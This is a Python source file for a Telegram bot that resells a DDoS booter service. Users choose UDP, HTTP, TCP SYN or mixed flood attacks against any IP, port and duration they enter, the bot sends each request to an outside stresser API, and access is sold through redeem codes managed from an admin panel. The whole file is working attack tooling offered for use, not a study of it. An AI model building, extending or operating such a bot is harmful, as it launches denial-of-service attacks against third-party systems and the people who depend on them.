# app.py - Final Working Version for Railway
import os
import logging
import random
import string
import aiohttp
import asyncio
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
API_KEY = os.getenv("API_KEY")
API_URL = "https://api.susstresser.com/panel/api/api.php"
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask app for healthcheck
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running! Send /start on Telegram."

@flask_app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "bot": "running",
        "timestamp": datetime.now().isoformat()
    })

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = False
        try:
            if mongo_uri:
                self.client = MongoClient(mongo_uri, serverSelectionTimeoutMS=5000)
                self.client.admin.command('ping')
                self.db = self.client["attack_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                
                self.users.create_index("user_id", unique=True)
                self.codes.create_index("code", unique=True)
                
                if not self.admins.find_one({"user_id": OWNER_ID}):
                    self.admins.insert_one({
                        "user_id": OWNER_ID,
                        "level": "owner",
                        "added_at": datetime.now()
                    })
                logger.info("✅ MongoDB connected successfully")
            else:
                raise Exception("No MongoDB URI provided")
        except Exception as e:
            logger.warning(f"⚠️ MongoDB failed: {e}, using in-memory storage")
            self.memory_mode = True
            self.users = {}
            self.codes = {}
            self.logs = []
            self.admins = {OWNER_ID: {"user_id": OWNER_ID, "level": "owner"}}
    
    def get_user(self, user_id):
        if not self.memory_mode:
            return self.users.find_one({"user_id": user_id})
        return self.users.get(user_id)
    
    def add_user(self, user_id, username=None, first_name=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"username": username, "first_name": first_name, "last_active": datetime.now()}},
                upsert=True
            )
        else:
            if user_id not in self.users:
                self.users[user_id] = {"user_id": user_id, "username": username, "first_name": first_name}
    
    def update_access(self, user_id, level, days):
        expiry = datetime.now() + timedelta(days=days)
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"access_level": level, "access_expiry": expiry}}
            )
        elif user_id in self.users:
            self.users[user_id]["access_level"] = level
            self.users[user_id]["access_expiry"] = expiry
    
    def is_admin(self, user_id):
        if not self.memory_mode:
            return self.admins.find_one({"user_id": user_id}) is not None
        return user_id in self.admins
    
    def add_admin(self, user_id, username):
        if not self.memory_mode:
            if not self.admins.find_one({"user_id": user_id}):
                self.admins.insert_one({
                    "user_id": user_id, 
                    "username": username, 
                    "level": "admin", 
                    "added_at": datetime.now()
                })
                return True
        else:
            if user_id not in self.admins and user_id != OWNER_ID:
                self.admins[user_id] = {"user_id": user_id, "level": "admin"}
                return True
        return False
    
    def remove_admin(self, user_id):
        if user_id == OWNER_ID:
            return False
        if not self.memory_mode:
            result = self.admins.delete_one({"user_id": user_id})
            return result.deleted_count > 0
        else:
            if user_id in self.admins:
                del self.admins[user_id]
                return True
        return False
    
    def create_code(self, code, days, level, created_by):
        if not self.memory_mode:
            if self.codes.find_one({"code": code}):
                return False
            self.codes.insert_one({
                "code": code, "access_days": days, "access_level": level,
                "created_by": created_by, "created_at": datetime.now(), "is_used": False
            })
            return True
        else:
            if code in self.codes:
                return False
            self.codes[code] = {
                "code": code, "access_days": days, "access_level": level, 
                "is_used": False, "created_at": datetime.now()
            }
            return True
    
    def use_code(self, code, user_id):
        if not self.memory_mode:
            code_data = self.codes.find_one({"code": code, "is_used": False})
            if code_data:
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                self.update_access(user_id, code_data["access_level"], code_data["access_days"])
                return code_data
        else:
            if code in self.codes and not self.codes[code]["is_used"]:
                code_data = self.codes[code]
                code_data["is_used"] = True
                self.update_access(user_id, code_data["access_level"], code_data["access_days"])
                return code_data
        return None
    
    def get_codes(self):
        if not self.memory_mode:
            return list(self.codes.find({}).sort("created_at", -1))
        return list(self.codes.values())
    
    def delete_code(self, code):
        if not self.memory_mode:
            result = self.codes.delete_one({"code": code})
            return result.deleted_count > 0
        else:
            if code in self.codes:
                del self.codes[code]
                return True
        return False
    
    def log_attack(self, user_id, target, port, duration, method, status, response=None):
        log = {
            "user_id": user_id, "target": target, "port": port,
            "duration": duration, "method": method, "status": status,
            "response": response, "timestamp": datetime.now()
        }
        if not self.memory_mode:
            self.logs.insert_one(log)
        else:
            self.logs.append(log)
    
    def get_logs(self, user_id=None, limit=50):
        if not self.memory_mode:
            query = {"user_id": user_id} if user_id else {}
            return list(self.logs.find(query).sort("timestamp", -1).limit(limit))
        else:
            logs = self.logs
            if user_id:
                logs = [l for l in logs if l["user_id"] == user_id]
            return sorted(logs, key=lambda x: x["timestamp"], reverse=True)[:limit]
    
    def get_all_users(self):
        if not self.memory_mode:
            return list(self.users.find({}))
        return list(self.users.values())
    
    def ban_user(self, user_id, reason=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": True, "ban_reason": reason, "banned_at": datetime.now()}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = True
    
    def unban_user(self, user_id):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": False, "ban_reason": None}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = False
    
    def get_stats(self):
        if not self.memory_mode:
            total = self.users.count_documents({})
            active = self.users.count_documents({"is_banned": False})
            banned = self.users.count_documents({"is_banned": True})
            attacks = self.logs.count_documents({})
            return {"total": total, "active": active, "banned": banned, "attacks": attacks}
        return {
            "total": len(self.users), 
            "active": len([u for u in self.users.values() if not u.get("is_banned")]),
            "banned": len([u for u in self.users.values() if u.get("is_banned")]), 
            "attacks": len(self.logs)
        }

db = Database(MONGO_URI)

# ===== API CALLER =====
async def call_attack_api(target, port, duration, method, api_key):
    """Call the attack API"""
    url = "https://api.susstresser.com/panel/api/api.php"
    params = {
        "key": api_key,
        "host": target,
        "port": port,
        "time": duration,
        "method": method
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, params=params) as response:
                result = await response.text()
                logger.info(f"API Response: {result[:200]}")
                return {"success": response.status == 200, "response": result}
    except asyncio.TimeoutError:
        return {"success": False, "error": "Request timeout"}
    except Exception as e:
        logger.error(f"API Error: {e}")
        return {"success": False, "error": str(e)}

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="menu_attack")],
        [InlineKeyboardButton("🎫 REDEEM", callback_data="menu_redeem")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="menu_info")],
        [InlineKeyboardButton("📊 STATS", callback_data="menu_stats")],
        [InlineKeyboardButton("📜 LOGS", callback_data="menu_logs")]
    ]
    
    if db.is_admin(user.id):
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="menu_admin")])
    
    await update.message.reply_text(
        "🤖 *ATTACK BOT*\n\nUse buttons below:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def menu_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 UDP", callback_data="attack_udp")],
        [InlineKeyboardButton("🔥 HTTP", callback_data="attack_http")],
        [InlineKeyboardButton("💣 TCP", callback_data="attack_tcp")],
        [InlineKeyboardButton("⚡ MIX", callback_data="attack_mix")],
        [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        "💥 *SELECT ATTACK METHOD*\n\n"
        "UDP - Layer 4 Flood\n"
        "HTTP - Layer 7 Flood\n"
        "TCP - SYN Flood\n"
        "MIX - Combined Attack",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = db.get_user(query.from_user.id)
    if user and user.get('is_banned'):
        await query.edit_message_text("❌ You are banned! Contact admin.")
        return
    
    method = query.data.split('_')[1]
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"⚔️ *{method.upper()} ATTACK*\n\n"
        "Send target details:\n"
        "`IP PORT DURATION`\n\n"
        "Example: `192.168.1.1 80 60`\n\n"
        "Max: 300 seconds\n"
        "Min: 10 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("❌ Cancelled.")
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text("❌ Use: `IP PORT DURATION`", parse_mode='Markdown')
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        method = context.user_data.get('attack_method', 'udp')
        
        if duration > 300:
            await update.message.reply_text("❌ Max 300 seconds!")
            return
        
        if duration < 10:
            await update.message.reply_text("❌ Min 10 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Starting {method.upper()} attack on {target}:{port}...\n"
            f"⏱️ Duration: {duration}s"
        )
        
        result = await call_attack_api(target, port, duration, method, API_KEY)
        
        if result.get('success'):
            await status_msg.edit_text(
                f"✅ *ATTACK SENT*\n\n"
                f"Target: `{target}:{port}`\n"
                f"Duration: {duration}s\n"
                f"Method: {method.upper()}\n"
                f"Status: ✅ Success",
                parse_mode='Markdown'
            )
            db.log_attack(update.effective_user.id, target, port, duration, method, 'success')
        else:
            error_msg = result.get('error', 'Unknown error')
            await status_msg.edit_text(
                f"❌ *ATTACK FAILED*\n\n"
                f"Error: {error_msg}",
                parse_mode='Markdown'
            )
            db.log_attack(update.effective_user.id, target, port, duration, method, 'failed', error_msg)
    
    except ValueError:
        await update.message.reply_text("❌ Invalid port or duration! Use numbers.", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode='Markdown')
    
    context.user_data['awaiting_attack'] = False

async def menu_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎫 ENTER CODE", callback_data="redeem_enter")],
        [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        "🎫 *REDEEM CODE*\n\nEnter your code to get access:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def redeem_enter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Send your redeem code (or /cancel):")
    context.user_data['awaiting_redeem'] = True

async def process_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_redeem'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_redeem'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    code = update.message.text.strip().upper()
    result = db.use_code(code, update.effective_user.id)
    
    if result:
        await update.message.reply_text(
            f"✅ *REDEEMED SUCCESSFULLY!*\n\n"
            f"Access Level: {result['access_level'].upper()}\n"
            f"Duration: {result['access_days']} days\n\n"
            f"Use /start to attack!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ *INVALID OR USED CODE*\n\n"
            "Please check your code and try again.",
            parse_mode='Markdown'
        )
    
    context.user_data['awaiting_redeem'] = False

async def menu_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = db.get_user(query.from_user.id)
    if not user:
        user = {"access_level": "user", "access_expiry": None, "is_banned": False}
    
    status = "✅ ACTIVE" if not user.get('is_banned') else "❌ BANNED"
    level = user.get('access_level', 'user').upper()
    
    expiry = user.get('access_expiry')
    if expiry:
        days = max(0, (expiry - datetime.now()).days)
        expiry_text = f"{expiry.strftime('%Y-%m-%d')} ({days}d left)"
    else:
        expiry_text = "No expiry"
    
    stats = db.get_stats()
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n"
        f"ID: `{query.from_user.id}`\n"
        f"Status: {status}\n"
        f"Level: {level}\n"
        f"Expiry: {expiry_text}\n\n"
        f"📊 *BOT STATS*\n"
        f"Users: {stats['total']}\n"
        f"Attacks: {stats['attacks']}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]])
    )

async def menu_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = db.get_stats()
    await query.edit_message_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Total Users: {stats['total']}\n"
        f"✅ Active: {stats['active']}\n"
        f"🚫 Banned: {stats['banned']}\n"
        f"💥 Attacks: {stats['attacks']}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]])
    )

async def menu_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    logs = db.get_logs(query.from_user.id, limit=10)
    
    if not logs:
        text = "📜 *YOUR ATTACK LOGS*\n\nNo attacks found."
    else:
        text = "📜 *YOUR LAST 10 ATTACKS*\n\n"
        for log in logs:
            status = "✅" if log.get('status') == 'success' else "❌"
            text += f"{status} `{log['target']}:{log['port']}` - {log['duration']}s ({log['method'].upper()})\n"
            text += f"   {log['timestamp'].strftime('%Y-%m-%d %H:%M')}\n\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]])
    )

# ===== ADMIN PANEL =====
async def menu_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not db.is_admin(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("✏️ EDIT CODE", callback_data="admin_edit")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("👑 ADD ADMIN", callback_data="admin_add")],
        [InlineKeyboardButton("❌ REMOVE ADMIN", callback_data="admin_remove")],
        [InlineKeyboardButton("📊 ALL LOGS", callback_data="admin_logs")],
        [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*\n\nSelect action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY - USER", callback_data="gen_1d_user")],
        [InlineKeyboardButton("📅 7 DAYS - USER", callback_data="gen_7d_user")],
        [InlineKeyboardButton("📅 30 DAYS - USER", callback_data="gen_30d_user")],
        [InlineKeyboardButton("👑 1 DAY - ADMIN", callback_data="gen_1d_admin")],
        [InlineKeyboardButton("👑 7 DAYS - ADMIN", callback_data="gen_7d_admin")],
        [InlineKeyboardButton("👑 30 DAYS - ADMIN", callback_data="gen_30d_admin")],
        [InlineKeyboardButton("🔙 BACK", callback_data="menu_admin")]
    ]
    
    await query.edit_message_text(
        "Select duration and level:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    parts = query.data.split('_')
    days = int(parts[1].replace('d', ''))
    level = parts[2]
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, level, query.from_user.id):
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\n"
            f"Code: `{code}`\n"
            f"Days: {days}\n"
            f"Level: {level.upper()}\n\n"
            f"Share this code with users!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="menu_admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:20]:
            status = "✅" if not c.get('is_used') else "❌"
            used_by = f" (by {c.get('used_by', 'N/A')})" if c.get('is_used') else ""
            text += f"{status} `{c['code']}` - {c['access_days']}d ({c['access_level']}){used_by}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="menu_admin")]])
    )

async def admin_edit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "✏️ *EDIT CODE*\n\n"
        "Send in format:\n"
        "`CODE NEW_DAYS NEW_LEVEL`\n\n"
        "Example: `ABCD1234 15 admin`\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_edit_code'] = True

async def process_edit_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_edit_code'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_edit_code'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    try:
        parts = update.message.text.split()
        code = parts[0].upper()
        new_days = int(parts[1])
        new_level = parts[2]
        
        if db.delete_code(code):
            if db.create_code(code, new_days, new_level, update.effective_user.id):
                await update.message.reply_text(f"✅ Code `{code}` updated to {new_days} days ({new_level})!", parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ Failed to update code!")
        else:
            await update.message.reply_text("❌ Code not found!")
    except:
        await update.message.reply_text("❌ Invalid format! Use: `CODE NEW_DAYS NEW_LEVEL`", parse_mode='Markdown')
    
    context.user_data['awaiting_edit_code'] = False

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🚫 *BAN USER*\n\nSend user ID to ban:\n`123456789`\n\nSend /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.ban_user(user_id, "Banned by admin")
        await update.message.reply_text(f"✅ User `{user_id}` banned!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "✅ *UNBAN USER*\n\nSend user ID to unban:\n`123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User `{user_id}` unbanned!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("📢 *BROADCAST*\n\nSend your message to all users:", parse_mode='Markdown')
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    message = update.message.text
    users = db.get_all_users()
    sent = 0
    
    status_msg = await update.message.reply_text(f"📡 Broadcasting to {len(users)} users...")
    
    for user in users:
        try:
            await context.bot.send_message(
                user['user_id'],
                f"📢 *ANNOUNCEMENT*\n\n{message}",
                parse_mode='Markdown'
            )
            sent += 1
        except:
            pass
    
    await status_msg.edit_text(f"✅ Broadcast sent to {sent} users!")
    context.user_data['awaiting_broadcast'] = False

async def admin_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "👑 *ADD ADMIN*\n\nSend user ID to promote:\n`123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_add_admin'] = True

async def process_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_add_admin'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        username = user.get('username', 'Unknown') if user else 'Unknown'
        
        if db.add_admin(user_id, username):
            await update.message.reply_text(f"✅ User `{user_id}` is now an admin!", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ User is already an admin or invalid!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_add_admin'] = False

async def admin_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "❌ *REMOVE ADMIN*\n\nSend user ID to remove from admin:\n`123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_remove_admin'] = True

async def process_remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_remove_admin'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        if db.remove_admin(user_id):
            await update.message.reply_text(f"✅ User `{user_id}` removed from admin!", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ Cannot remove owner or invalid user!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_remove_admin'] = False

async def admin_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    logs = db.get_logs(limit=50)
    
    if not logs:
        text = "📊 *NO ATTACK LOGS*"
    else:
        text = "📊 *RECENT ATTACK LOGS (50)*\n\n"
        for log in logs[:20]:
            status = "✅" if log.get('status') == 'success' else "❌"
            text += f"{status} User: `{log['user_id']}`\n"
            text += f"   Target: `{log['target']}:{log['port']}` - {log['duration']}s ({log['method'].upper()})\n"
            text += f"   {log['timestamp'].strftime('%Y-%m-%d %H:%M')}\n\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="menu_admin")]])
    )

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="menu_attack")],
        [InlineKeyboardButton("🎫 REDEEM", callback_data="menu_redeem")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="menu_info")],
        [InlineKeyboardButton("📊 STATS", callback_data="menu_stats")],
        [InlineKeyboardButton("📜 LOGS", callback_data="menu_logs")]
    ]
    
    if db.is_admin(query.from_user.id):
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="menu_admin")])
    
    await query.edit_message_text(
        "🤖 *MAIN MENU*\n\nSelect an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ All operations cancelled!")

# ===== MAIN =====
def main():
    """Main function to run both Flask and Telegram bot"""
    print("=" * 50)
    print("Starting Attack Bot on Railway...")
    print("=" * 50)
    
    # Create event loop for the main thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Build the application
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(main_menu, pattern="^main_menu$"))
    app.add_handler(CallbackQueryHandler(menu_attack, pattern="^menu_attack$"))
    app.add_handler(CallbackQueryHandler(handle_attack, pattern="^attack_"))
    app.add_handler(CallbackQueryHandler(menu_redeem, pattern="^menu_redeem$"))
    app.add_handler(CallbackQueryHandler(redeem_enter, pattern="^redeem_enter$"))
    app.add_handler(CallbackQueryHandler(menu_info, pattern="^menu_info$"))
    app.add_handler(CallbackQueryHandler(menu_stats, pattern="^menu_stats$"))
    app.add_handler(CallbackQueryHandler(menu_logs, pattern="^menu_logs$"))
    app.add_handler(CallbackQueryHandler(menu_admin, pattern="^menu_admin$"))
    
    # Admin
    app.add_handler(CallbackQueryHandler(admin_gen, pattern="^admin_gen$"))
    app.add_handler(CallbackQueryHandler(process_gen, pattern="^gen_"))
    app.add_handler(CallbackQueryHandler(admin_list, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_edit, pattern="^admin_edit$"))
    app.add_handler(CallbackQueryHandler(admin_ban, pattern="^admin_ban$"))
    app.add_handler(CallbackQueryHandler(admin_unban, pattern="^admin_unban$"))
    app.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
    app.add_handler(CallbackQueryHandler(admin_add, pattern="^admin_add$"))
    app.add_handler(CallbackQueryHandler(admin_remove, pattern="^admin_remove$"))
    app.add_handler(CallbackQueryHandler(admin_logs, pattern="^admin_logs$"))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_redeem))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_edit_code))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_add_admin))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_remove_admin))
    
    # Initialize the application
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    
    logger.info("✅ Bot initialized and ready!")
    
    # Start polling in background
    loop.create_task(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("🤖 Bot started polling for updates...")
    
    # Run Flask in the same thread (blocking)
    logger.info(f"🌐 Web server running on port {PORT}")
    flask_app.run(host='0.0.0.0', port=PORT)

if __name__ == "__main__":
    main()